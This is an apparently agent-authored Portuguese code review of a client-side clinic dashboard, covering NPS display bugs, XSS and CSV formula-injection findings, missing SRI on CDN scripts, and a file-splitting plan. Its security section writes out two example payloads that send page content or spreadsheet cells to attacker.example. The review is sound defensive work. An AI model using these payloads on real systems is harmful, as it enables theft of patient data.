# Revisão de Código — index.html (2026-08-07)

## Como usar este documento

Este arquivo é o resultado de uma revisão completa do `index.html` (na época com 4169 linhas), feita por 8 agentes em paralelo (4 revisores + 4 verificadores adversariais — nenhum achado foi refutado na verificação).

**Status (2026-08-11)**: Fases 1 e 2 implementadas, testadas no navegador e commitadas/pushadas na branch `fix/nps-negativo-e-escaping-xss` (sem merge ainda — aguardando revisão do usuário). **Fase 3 adiada de propósito**: o usuário quer fazer ajustes visuais e de regras de negócio no arquivo único primeiro, e só depois dividir em múltiplos arquivos — ver aviso no início da seção da Fase 3 com o checklist de "antes de executar". Detalhes do que foi feito em cada fase, item por item, nas seções abaixo.

Se você é uma sessão do Claude Code lendo isso pela primeira vez: **leia o `CLAUDE.md` na raiz do projeto primeiro** — ele é a fonte da verdade das regras de negócio, tem o histórico de bugs já corrigidos (não reintroduzir) e as preferências do usuário (sempre confirmar antes de `git push`/merge; testar no navegador antes de reportar como concluído). Depois volte aqui.

**Ordem de execução recomendada** — 3 fases independentes, cada uma testável isoladamente antes de passar pra próxima. Não pule pra Fase 3 sem terminar 1 e 2; é a fase de maior risco por tocar o arquivo inteiro.

1. **Fase 1 — Bugs + Segurança** (risco baixo, mudanças pontuais e localizadas)
2. **Fase 2 — Deduplicação** (risco médio, ainda sem mudança estrutural)
3. **Fase 3 — Divisão em múltiplos arquivos** (risco maior, fazer por último, com checklist de teste completo no final deste documento)

Depois de qualquer fase: fazer numa branch nova (`fix/...`, `refactor/...`), testar no navegador (via Browser tool) upload de planilha real + as 4 abas, e só then avisar o usuário pra revisar antes de dar merge — merge = publicação imediata em produção (Netlify + GitHub Pages).

---

## FASE 1.A — Bugs de regra de negócio ✅ FEITO (todos os 3 itens abaixo)

### 1. NPS negativo exibido como "0,00" (média severidade)

- **Onde**: chamada em [index.html:3422](index.html:3422); função `renderNpsGauge` em [index.html:3430-3479](index.html:3430), clamp na linha 3432, exibição do número na linha 3476.
- **Problema**: `npsScore = %promotores − %detratores` ([index.html:3414](index.html:3414)) pode ser negativo (a régua Promotor 9-10/Neutro 7-8/Detrator 0-6 permite isso). A chamada já faz `renderNpsGauge(Math.max(0, npsScore))`, e a própria função reclampa com `const v = Math.max(0, Math.min(100, value))`, usando `v` tanto pro ponteiro quanto pro número grande no centro (`v.toFixed(2)`, linha 3476).
- **Cenário de falha**: 10 avaliações, 1 nota 10 e 9 notas 5. `npsScore = round(10 - 90) = -80`. O mostrador exibe "0,00" com o ponteiro no início da escala — idêntico visualmente a um período genuinamente neutro. Esconde uma crise de NPS do operador.
- **Correção sugerida**: em [index.html:3422](index.html:3422), trocar para `renderNpsGauge(npsScore)` (tirar o `Math.max` externo). Dentro de `renderNpsGauge`, manter uma variável clampada só pra geometria (`const vClamped = Math.max(0, Math.min(100, value));`) e usá-la pro ângulo do ponteiro/arcos, mas usar o `value` original (não clampado) na linha 3476 pro número exibido — assim um score negativo ainda trava o ponteiro na ponta esquerda, mas mostra o número negativo real.

### 2. Gráfico "NPS por Clínica" com eixo fixo 0-100 (média severidade)

- **Onde**: cálculo do score em [index.html:3491-3496](index.html:3491) (sem limite, pode ser negativo); escala do eixo X hardcoded em [index.html:3516](index.html:3516) (`x: { min: 0, max: 100, ... }`).
- **Problema**: Chart.js posiciona as barras contra os limites configurados da escala. Uma clínica com score negativo não consegue desenhar uma barra de comprimento negativo — colapsa pra origem, idêntico a uma clínica com score exatamente 0.
- **Cenário de falha**: clínica com 0 promotores, 6 detratores, 2 neutros em 8 avaliações → score = -75. Renderiza como barra de comprimento zero, em vez de aparecer no fundo do ranking como a pior clínica.
- **Correção sugerida**: trocar linha 3516 para `x: { min: -100, max: 100, ... }`. Os thresholds de cor (linha 3506: `score >= 90 ? verde : score >= 70 ? amarelo : vermelho`) já colocam qualquer score negativo no vermelho — não precisa mexer ali.

### 3. Escaping inconsistente entre "Destaques" e "Avaliações Detalhadas" do NPS

- Ver item de segurança 1 abaixo — é o mesmo problema, catalogado ali com o resto dos sinks de XSS.

---

## FASE 1.B — Segurança ✅ FEITO (todos os 3 itens abaixo)

Contexto: é um dashboard 100% client-side (sem backend), mas cada usuário sobe sua própria planilha com dados reais de paciente (nome, telefone, endereço) em runtime, e os relatórios exportados são reenviados pra clínicas parceiras. Nada aqui é RCE de servidor — é execução de JS no navegador de quem abre a aba, e vazamento de dados de paciente já renderizados na tela.

### 1. XSS por interpolação sem escapar em `innerHTML` (ALTA severidade)

`escapeHtml()` existe (linha 3598) e é usado em alguns lugares (cards de "Destaques" do NPS: linhas 3654, 3666, 3671, 3681-3683; tabela de Valor Base: 1820-1840; multi-select: 1941, 2017), mas os campos abaixo — vindos direto da planilha, texto livre — vão pro `innerHTML` **sem escapar**:

| Função | Linhas | Campos não escapados |
|---|---|---|
| `renderPatientTable` (Lista Detalhada, Consultas) | [2965-2998](index.html:2965) | nameStr (2981), dataStr (2986), surgStr (2987), clinicStr (2988), statusStr (2991, vem de `buildStatusJourneyCell`), docStr (2995). Só `telefoneStr` (2983) é escapado. |
| `renderGanhoPatientTable` (Pacientes Potenciais, Ganho) | [3052-3085](index.html:3052) | Mesmo padrão: nameStr (3068), dataStr (3073), surgStr (3074), clinicStr (3075), statusStr (3078), docStr (3082). Só telefoneStr (3070) escapado. |
| `renderNpsTable` (Avaliações Detalhadas, NPS) | [3713-3743](index.html:3713) | nome (3732), telefone (3733 — **nem o telefone é escapado aqui**, diferente das outras tabelas), clinica (3734), medico (3735). |
| `renderFaturamentoTable` | [1526-1538](index.html:1526) | rec.id, rec.paciente, rec.clinica, rec.especialidade, rec.medico — nenhum campo escapado nessa função inteira. |
| `renderClinicSummaryTable` | [2866-2888](index.html:2866), campo em 2872 | clinicName — mesmo valor que já é escapado em `buildValorBaseCombos` (linha 1834), mas não aqui. |
| `renderCharts` — legenda do donut de status | [2757-2772](index.html:2757), interpolado em 2764 | `label` do status, usado tanto no texto quanto dentro de `title="${label}"` (atributo — vetor mais direto de injeção, nem precisa de tag preservada). |

- **Cenário de falha**: uma linha da planilha com Clínica = `<img src=x onerror=fetch('https://attacker.example/x?d='+document.body.innerHTML)>` executa esse JS no navegador de quem abrir qualquer uma dessas abas, com acesso a todos os dados de paciente já renderizados na página.
- **Correção sugerida**: envolver cada campo de texto livre citado acima com `escapeHtml(...)` antes de interpolar. Como o padrão se repete em ~5 funções, vale criar um helper que já aplica o fallback padrão também:
  ```js
  function safeCell(v) { return escapeHtml(v) || '-'; }
  ```
  e trocar `${clinicStr || '-'}` por `${safeCell(clinicStr)}` etc. nos 5 lugares.

### 2. Injeção de fórmula em CSV/Excel na exportação (média severidade)

- **Onde**: `exportRowsAsSpreadsheet`/`exportRowsAsCSV` ([index.html:4012-4025](index.html:4012)) — usadas por todos os `buildXExportRows()`. Confirmado: nenhuma sanitização de células começando com `=`, `+`, `-` ou `@` (prefixos clássicos de formula injection) em lugar nenhum do arquivo.
- **Cenário de falha**: se um campo de paciente/clínica/médico/comentário na planilha de origem começar com `=HYPERLINK("http://attacker.example/steal?x="&A1,"clique aqui")`, essa fórmula viva vai pro `.xlsx`/`.csv` exportado; quando a clínica parceira ou a equipe da CdV abrir no Excel/Sheets, o link pode vazar dados.
- **Correção sugerida**: helper `sanitizeForSpreadsheet(value)` que prefixa um `'` (apóstrofo) em qualquer valor de string que comece com `=`, `+`, `-` ou `@`, aplicado a cada campo dentro dos `buildXExportRows()` (ou de forma central, mapeando cada linha antes de `json_to_sheet()`).

### 3. CDNs sem SRI e sem versão fixa (média severidade)

- **Onde**: os 6 `<script>` de CDN — linhas 8, 16, 17, 18, 21, 22, 23 — nenhum tem `integrity`/`crossorigin`. Tailwind (linha 8) e Lucide (`lucide@latest`, linha 18) nem estão fixados numa versão.
- **Cenário de falha**: se um desses CDNs for comprometido, o script injetado roda com privilégio total da página (sem CSP restringindo) e pode exfiltrar os dados de paciente já na tela. O `@latest` do Tailwind/Lucide também significa que o código servido pode mudar a qualquer momento fora do controle da equipe.
- **Correção sugerida**: adicionar `integrity="sha384-..."` + `crossorigin="anonymous"` nos scripts do jsdelivr/cdnjs/unpkg (todos já versionados, então o hash é estável), e fixar uma versão exata de Tailwind e Lucide em vez de URL sem versão/`@latest`.

---

## FASE 2 — Duplicação (reduz linhas de verdade) — 6 de 7 itens feitos, 1 adiado (ver item 1)

### 1. ⏸️ ADIADO — Bloco "Exportar como..." repetido 16x no HTML (severidade alta pro objetivo de reduzir linhas)

> Decisão em 2026-08-11: não implementado nesta rodada. É o item de maior risco (toca os 16 blocos de markup + onclick de todos os cards), e o item 2 abaixo já resolve a duplicação de *lógica* (18 funções → 1 dispatcher) sem tocar o HTML — risco bem menor pro mesmo objetivo de reduzir linhas. Revisitar só se quiser ir além.

- **Onde** (toggle + menu, ~14 linhas cada): 309-322, 341-354, 375-388, 413-426, 444-457, 475-490, 533-548, 693-706, 721-734, 750-763, 784-797, 820-835, 935-950, 1044-1057, 1083-1098, 1143-1158.
- **Problema**: variam só no id do menu, no id/título da seção passado pra função de export, e se é a variante de 2 formatos (cards de gráfico: PDF/JPEG) ou 3 formatos (listas: Planilha/CSV/PDF).
- **Correção sugerida**: função JS `renderExportMenu(menuId, kind, entityIdOrTitle)` que devolve o HTML do toggle+menu, gerando os 16 menus a partir de um array de config no `DOMContentLoaded` — corta ~200 linhas hand-written pra bem menos de 30.

### 2. ✅ FEITO — 18 funções wrapper de exportação idênticas (severidade média)

- **Onde**: 1888-1899 (valorBase), 3109-3120 (ganho patients), 4064-4075 (patients), 4091-4102 (clinic summary), 4129-4140 (nps), 4155-4166 (faturamento) — 6 entidades × 3 formatos, cada wrapper é só `closeExportMenus(); exportRowsAsX(buildYRows(), sheetName, filenameBase);`.
- **Correção sugerida**: 1 array de config (`EXPORT_CONFIGS = { patients: {build: buildPatientExportRows, sheet:'Pacientes', file:'Lista_Detalhada_Pacientes', title:'...'}, ... }`) + 1 dispatcher `exportAs(entity, format)`; trocar os `onclick` do HTML pra chamar `exportAs('patients','pdf')` etc.

### 3. ✅ FEITO — Linha de tabela de paciente duplicada verbatim (severidade alta)

- **Onde**: [renderPatientTable (2965-2998)](index.html:2965) e [renderGanhoPatientTable (3052-3085)](index.html:3052) — só `buildStatusJourneyCell()` foi extraído; o resto da `<tr>` (nome/ID/telefone/nascimento, data, cirurgia, clínica, médico) é copy-paste.
- **Correção sugerida**: extrair `buildPatientRowHtml(item)` retornando a `<tr>` inteira, chamado nas duas funções.

### 4. ✅ FEITO — `getSearchedPatientData` vs `getSearchedGanhoPatientData` (severidade média)

- **Onde**: [2895-2904](index.html:2895) e [3025-3034](index.html:3025) — mesmo predicado de busca por nome/id/médico/observação duplicado.
- **Correção sugerida**: extrair `patientMatchesSearch(item, search)` compartilhado.

### 5. ✅ FEITO — Paginação reimplementada 4x + 8 handlers de clique (severidade média)

- **Onde** (slice+rodapé): 1515-1524 & 1544-1547 (Faturamento); 2954-2963 & 3004-3007 (Patients); 3041-3050 & 3091-3094 (Ganho patients); 3702-3711 & 3749-3752 (NPS). Handlers de prev/next: 2141-2154, 2166-2178, 2185-2197, 2217-2229.
- **Correção sugerida**: `paginate(data, page, pageSize, exportAll)`, `updatePaginationFooter(...)` e `bindPrevNext(...)` como 3 helpers reutilizados nas 4 tabelas.

### 6. ✅ FEITO — Array de aliases de clínica retipado 15x (severidade média)

> Na implementação, o mesmo padrão apareceu também pra especialidade (14x), status (8x) e médico (7x) — não só clínica (15x). Virou `CLINIC_ALIASES`/`SURGERY_ALIASES`/`STATUS_ALIASES`/`MEDICO_ALIASES`, as 4 juntas.

- **Onde**: `['clinicas', 'clínica', 'clinica', 'Unidade']` (e arrays paralelos de especialidade/status) aparecem literal em 1478-1489, 1618-1648, 2079-2099, 1657-1661, 2244-2248, entre outros (15 ocorrências no total via grep).
- **Correção sugerida**: constantes únicas (`CLINIC_ALIASES`, `SURGERY_ALIASES`, `STATUS_ALIASES`) perto do `HEADER_ALIASES`, e trocar as 15+ arrays literais por referência a elas — um terceiro formato de planilha no futuro só precisa mudar em um lugar.

### 7. ✅ FEITO — Classe do badge de status repetida 4x (severidade baixa)

- **Onde**: string `"inline-block px-2.5 py-1 text-[10px] font-bold rounded-full border ..."` repetida em 1533, 2990, 3077, 3737.
- **Correção sugerida**: adicionar `.badge-pill { ... }` no bloco `<style>` (linhas 46-112) e trocar as 4 ocorrências por `class="badge-pill ${badgeColor}"`.

### Observações à parte (não são bugs, notadas de passagem)

- `NPS_AVAL_FIELDS` é um array literal com as mesmas 4 strings que já existem como `Object.keys(NPS_AVAL_LABELS)` algumas linhas acima — trocar por `Object.keys(NPS_AVAL_LABELS)` remove o risco de as duas listas divergirem.

---

## FASE 3 — Plano de divisão em múltiplos arquivos

> **⏸️ ADIADA a pedido do usuário (2026-08-11)** — Fases 1 e 2 já foram commitadas/pushadas na branch `fix/nps-negativo-e-escaping-xss`. O usuário quer fazer ajustes visuais e de regras de negócio **antes** desta fase, de propósito: é mais barato mexer no arquivo único agora e só depois separar em `js/*.js`, do que separar primeiro e ter que replicar cada ajuste em vários arquivos.
>
> **Antes de executar esta fase, quando for a vez dela:**
> 1. **Confirmar com o usuário que os ajustes visuais/de regras planejados já foram feitos e commitados** — não começar a divisão de arquivo com trabalho pendente misturado.
> 2. **Regerar o mapa de funções do zero**, não confiar no mapa deste documento (linhas e até nomes de função vão ter mudado): `grep -n "^\s*function " index.html` pra função + `grep -noE "let [A-Za-z0-9_]+|const [A-Za-z0-9_]+" index.html` (filtrando o que é state de nível superior, não dentro de função) pra variáveis. Um verificador anterior já pegou 3 funções (`captureSectionCanvas`, `exportSectionAsJpeg`, `exportSectionAsPdf`) fora do mapa original — não é a primeira vez que o mapa fica incompleto.
> 3. **Reclassificar qualquer função/variável nova** que os ajustes visuais/de regra tiverem introduzido, decidindo em qual dos 7 arquivos abaixo ela se encaixa (ou se precisa de um 8º arquivo, se for algo que não se encaixa em nenhuma das 4 páginas nem é genérico o bastante pra `utils.js`).
> 4. **Confirmar que os ajustes anteriores não adicionaram nenhuma leitura de estado de outro arquivo fora de função** (top-level, fora de `function`) — é a única coisa que quebraria com a ordem de carregamento dos 7 `<script>`, ver `shared_state_notes` abaixo.
> 5. Criar branch nova a partir da `main` já atualizada (com as Fases 1+2 mescladas), rodar o checklist de teste completo no final deste documento, e só então pedir revisão antes do merge.
>
> Objetivo: nenhuma mudança de comportamento, só reorganização. Mantém **100% sem build step** — tudo `<script src="js/...">` clássico (não `type="module"`, que quebraria ao abrir o arquivo localmente via `file://` por causa de CORS). Plano verificado por um segundo agente que conferiu ordem de carregamento e inventário de variáveis globais (veredito: **sólido** — só 3 observações menores, já incorporadas abaixo).

### Estrutura final

```
index.html         (4169 → ~1200 linhas: só head/CDN/style/markup das 4 abas)
js/utils.js         (~580L)
js/consultas.js     (~930L)
js/nps.js           (~580L)
js/faturamento.js   (~150L)
js/ganho.js         (~440L)
js/exportacao.js    (~520L)
js/main.js          (~210L)
```

**styles.css**: avaliado e **não recomendado** — o bloco `<style>` (linhas 46-112) tem só 66 linhas e já fica no topo do arquivo, fácil de achar sem rolar. Extrair ganha pouco e cria mais um arquivo pra manter sincronizado.

### `index.html` (modificado, não novo)

- **Sem mudança**: linhas 1-112 (todos os `<script>` de CDN, o `tailwind.config` inline, o bloco `<style>`) — continuam exatamente onde estão, no `<head>`.
- **Sem mudança**: linhas 113-1187 (todo o markup do body: header, nav de abas, as 4 seções de aba).
- **Muda**: o `<script>` grande (linhas 1188-4167) é apagado e substituído por 7 tags `<script src="js/....js"></script>` sequenciais, no mesmo lugar (imediatamente antes de `</body>`) — não mover pro `<head>`, não usar `type="module"`, não usar `defer`/`async`.

### `js/utils.js` — helpers e config compartilhados entre 2+ páginas

Conteúdo: `pageSize`; `normalizeStatusText`, `STATUS_CANONICAL`, `STATUS_FUZZY_FALLBACK`, `classifyStatus`, `statusGroup`; `GARGALO_GROUPS`, `getJourneyOverdueDays`; `PROCEDURE_SLOTS`, `getProcedureSlots` (usado por `computeMedianDaysToFirstSurgery` do Consultas E por `getPendingBillingRecords` do Faturamento); `parseFlexibleDate`, `isWithinPeriod`; `getItemProp`, `escapeHtml`; todo o componente multi-select (`MULTI_ACCENTS`, `multiSelectState`, `initMultiSelects`, `visibleMultiSelectOptions`, `renderMultiSelectOptions`, `updateMultiSelectLabel`, `commitMultiSelect`, `populateMultiSelect`, `getMultiSelectValues`, `matchesMultiSelect`, `closeMultiSelectPanels`, `populateSelect`); `getPatientTelefone`, `getPatientNascimento`, `buildStatusJourneyCell` (usado por Consultas E Ganho); `npsFormatTelefone` (apesar do nome, usado por Consultas/Ganho/NPS/Exportação — **não é exclusivo do NPS**, cuidado pra não duplicar dentro de `nps.js`); `HEADER_ALIASES`, `normalizeHeaders` (usado pelos dois uploads); `MIN_SAMPLE_SIZE`, `SLA_PADRAO`, `SPECIALTY_RULES`, `getSpecialtyRule`, `TIER_ORDER`, `normalizeSpecialtyKey`, `getSpecialtyTierOrder` (chamado por `renderGanhoPotencialCards` e `sortedEspecialidades` do Ganho — **não** por `populateGanhoFilters`, que chama `normalizeSpecialtyKey` diretamente).

### `js/consultas.js`

Estado: `rawData`, `filteredData` (inicializar como `[]` direto, não `[...rawData]` — no load `rawData` é sempre `[]` nesse ponto, é comportamentalmente idêntico e mais simples de ler), `currentPage`, `chartStatusInstance`, `chartSurgeriesInstance`, `chartClinicsInstance`, `STATUS_COLORS`, `CORE_SPECIALTIES`, `RESPONSAVEL_BADGE`.
Funções: `needsSecondEyeFollowUp`, `collectUnknownStatuses`, `renderUnknownStatusWarning`, `populateFilterDropdowns`, `applyFilters`, `updateDashboard`, `updateKPIs`, `buildGroupStats`, `computeMedianDaysToFirstSurgery`, `classifyMedianSLA`, `renderGeneralSummaryCard`, `buildRecommendations`, `renderSpecialtyInsightCard`, `renderMedianSurgeryCard`, `renderAIInsights`, `renderFunnel`, `renderCharts`, `buildClinicSummary`, `renderClinicSummaryTable`, `getSearchedPatientData`, `renderPatientTable`, `handleFileUpload`.

### `js/nps.js`

Estado: `npsRawData`, `npsFilteredData`, `npsCurrentPage`, `chartNpsClinicsInstance`, `NPS_COMMENT_FIELDS`, `NPS_AVAL_LABELS`, `NPS_AVAL_FIELDS`, `NPS_NEGATIVE_KEYWORDS`, `NPS_NON_TEXT_FIELDS`.
Funções: `npsHandleFileUpload`, `npsPopulateFilters`, `npsApplyFilters`, `npsGetNota`, `npsGetClinica`, `npsGetMedico`, `npsGetEspecialidade`, `npsGetPaciente`, `npsGetTelefone`, `npsGetComentario`, `npsGetCategoriasNegativas`, `npsUpdateDashboard`, `renderNpsGauge`, `renderNpsClinicsChart`, `npsCategoryStats`, `renderNpsCategories`, `normalizeFreeText`, `findNegativeKeywords`, `renderNpsDestaques`, `renderNpsTable`.

### `js/faturamento.js` (o menor arquivo)

Estado: `faturamentoFilteredRecords`, `faturamentoCurrentPage`.
Funções: `getPendingBillingRecords`, `populateFaturamentoFilters`, `applyFaturamentoFilters`, `renderFaturamentoTable`.

### `js/ganho.js`

Estado: `ganhoFilteredData`, `valorBaseConfig`, `VALOR_BASE_STORAGE_KEY`, `GANHO_DEFAULT_SPECIALTY_ORDER`, `GANHO_ACCENT_PALETTE`, `valorBaseExpandedGroups`, `ganhoPatientCurrentPage`.
Funções: `loadValorBaseConfig`, `saveValorBaseConfig`, `valorBaseKey`, `getValorBase`, `setValorBase`, `populateGanhoFilters`, `applyGanhoFilters`, `buildGanhoEspecialidadeStats`, `formatBRL`, `renderGanhoResumoCard`, `renderGanhoEspecialidadeCard`, `renderGanhoPotencialCards`, `buildValorBaseCombos`, `sortedEspecialidades`, `renderValorBaseTable`, `handleValorBaseGroupToggle`, `handleValorBaseInput`, `getGanhoConvertiblePatients`, `getSearchedGanhoPatientData`, `renderGanhoPatientTable`.

### `js/exportacao.js`

Funções: `downloadTextFile`, `hasRowsToExport`, `exportRowsAsSpreadsheet`, `exportRowsAsCSV`, `exportRowsAsPdf`, `todayStamp`, `toggleExportMenu`, `closeExportMenus`, `closeAllDropdowns` (+ o listener de `click` no document), `captureSectionCanvas`, `exportSectionAsJpeg`, `exportSectionAsPdf`, e todos os `buildXExportRows`/`exportXAsSpreadsheet`/`exportXAsCSV`/`exportXAsPdf` (patients, clinic summary, nps, faturamento, valorBase, ganho patients), `exportReport`, `setTablesPrintMode`, os listeners de `beforeprint`/`afterprint`.

> Nota: o mapa de funções usado nessa revisão tinha omitido `captureSectionCanvas` (linha 3873), `exportSectionAsJpeg` (3924) e `exportSectionAsPdf` (3938) — todas ficam entre `closeAllDropdowns` (3848) e `downloadTextFile` (3992). Já estão listadas corretamente acima; é só um aviso de que o mapa original não é 100% confiável como inventário e vale re-gerar por grep na hora de executar (`grep -n "^\s*function " index.html`).

### `js/main.js` (carrega por último)

Estado: `activeTab`, `TAB_LABELS`.
Funções: `updateStickyOffsets`, o bloco de bootstrap `DOMContentLoaded`, `setupEventListeners`, `updateTabNav`, `switchTab`.

### Ordem de carregamento

```html
<script src="js/utils.js"></script>
<script src="js/consultas.js"></script>
<script src="js/nps.js"></script>
<script src="js/faturamento.js"></script>
<script src="js/ganho.js"></script>
<script src="js/exportacao.js"></script>
<script src="js/main.js"></script>
```

`utils.js` primeiro porque declara os primitivos (config, componente multi-select) que os outros usam. As 4 páginas entre si e `exportacao.js` não têm leitura imediata (fora de função) de variável de outro arquivo — toda referência cruzada acontece dentro de uma função chamada só por evento ou pelo bootstrap do `DOMContentLoaded`, ou seja, depois que os 7 `<script>` já terminaram de executar. `main.js` por último porque é o único arquivo que assume que tudo dos outros 6 já existe no momento em que roda (o `setupEventListeners` referencia handlers de todas as páginas).

**Cuidado**: não usar `defer`/`async` em nenhuma das 7 tags — quebraria a garantia de "tudo termina antes do DOMContentLoaded" da qual essa análise de ordem depende.

### Riscos / cuidados na migração

1. Isso reduz linhas **por arquivo**, não o total (~2981 linhas hoje viram ~3410 somadas nos 7 arquivos, por causa de comentários de cabeçalho explicando o papel de cada arquivo — vale o espaço).
2. Nenhuma função pode ficar duplicada ou sem dono. Depois de criar os arquivos, rodar `grep -o 'function [A-Za-z0-9_]*' js/*.js | sort | uniq -c` e conferir que cada nome aparece em exatamente 1 arquivo.
3. As tags `<script>` de CDN e o `tailwind.config` inline **não se movem** — continuam antes de qualquer markup do body, exatamente como hoje.
4. Salvar os novos `.js` em UTF-8 (várias strings têm acento — "Não Especificado", "Não identificada" etc.) — um editor que reencode silenciosamente corromperia esses textos.
5. Confirmar que a pasta `js/` não é ignorada por nenhuma regra do `.gitignore` antes do primeiro push (Netlify e GitHub Pages servem pastas estáticas automaticamente, sem config extra).
6. Testar abrindo o `index.html` por duplo-clique local (`file://`), não só via servidor — `<script src="js/...">` clássico funciona em `file://` (diferente de `type="module"`, que seria bloqueado por CORS), mas vale confirmar na prática.
7. Funções referenciadas por `onclick="..."` no HTML precisam continuar acessíveis globalmente exatamente como hoje.

---

## Checklist de teste pós-mudança (qualquer fase)

Do jeito que o CLAUDE.md já pede: testar no navegador antes de reportar como concluído, cobrindo:

- [ ] Upload de planilha de exemplo (formato completo e, se disponível, o formato resumido)
- [ ] As 4 abas renderizam: KPIs, funil, gráficos, insights (Consultas); gauge, categorias, destaques, tabela (NPS); tabela (Faturamento); cards, tabela de valor base, lista de pacientes (Ganho)
- [ ] Filtros multi-select (Clínica, Especialidade) e paginação funcionam nas páginas que têm
- [ ] Os 3 formatos de exportação (Planilha/CSV/PDF) nas 6 listas + exportação de imagem (JPEG/PDF) nos 10 cards de gráfico/insight
- [ ] Botão "Imprimir Painel" no topo (ausente na página de Faturamento, de propósito)
- [ ] Especial atenção depois da Fase 3: como renderização e exportação passam a estar em arquivos diferentes, exportação é a superfície de regressão mais provável.
